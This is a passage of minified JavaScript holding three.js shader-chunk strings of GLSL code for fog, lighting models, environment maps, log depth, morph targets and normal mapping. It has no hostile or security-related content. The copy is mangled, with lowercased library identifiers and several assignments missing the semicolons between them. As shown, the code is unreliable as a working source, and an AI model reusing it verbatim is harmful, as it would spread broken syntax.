worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\" three.shaderchunk.fog_fragment=\"#ifdef USE_FOG\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tfloat depth = gl_FragDepthEXT / gl_FragCoord.w;\\n\\t#else\\n\\t\\tfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\n\\t#endif\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * depth * depth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, depth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\" three.shaderchunk.fog_pars_fragment=\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\" ;three.shaderchunk.lightmap_fragment=\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\" ;three.shaderchunk.lightmap_pars_fragment=\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\" three.shaderchunk.lights_lambert_vertex=\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\" three.shaderchunk.lights_pars=\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tif ( testLightInRange( lightDistance, pointLight.distance ) ) {\\n\\t\\t\\tdirectLight.color = pointLight.color;\\n\\t\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( all( bvec2( angleCos > spotLight.coneCos, testLightInRange( lightDistance, spotLight.distance ) ) ) ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\t#include <normal_flip>\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\t#include <normal_flip>\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\" three.shaderchunk.lights_phong_fragment=\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\" ;three.shaderchunk.lights_phong_pars_fragment=\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\" three.shaderchunk.lights_physical_fragment=\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\" three.shaderchunk.lights_physical_pars_fragment=\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectSpecular += radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\" three.shaderchunk.lights_template=\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t \\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\t\\t\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\" three.shaderchunk.logdepthbuf_fragment=\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\" ;three.shaderchunk.logdepthbuf_pars_fragment=\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.logdepthbuf_pars_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\" three.shaderchunk.logdepthbuf_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.map_fragment=\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\" three.shaderchunk.map_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\" ;three.shaderchunk.map_particle_fragment=\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\" ;three.shaderchunk.map_particle_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\" ;three.shaderchunk.metalnessmap_fragment=\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\" three.shaderchunk.metalnessmap_pars_fragment=\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\" ;three.shaderchunk.morphnormal_vertex=\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\" three.shaderchunk.morphtarget_pars_vertex=\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\" ;three.shaderchunk.morphtarget_vertex=\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\" three.shaderchunk.normal_flip=\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\" ;three.shaderchunk.normal_fragment=\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\" three.shaderchunk.normalmap_pars_fragment=\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\" three.shaderchunk.packing=\"vec3 packNormalToRGB( const in vec3 normal ) {\\n  return normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n  return 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= 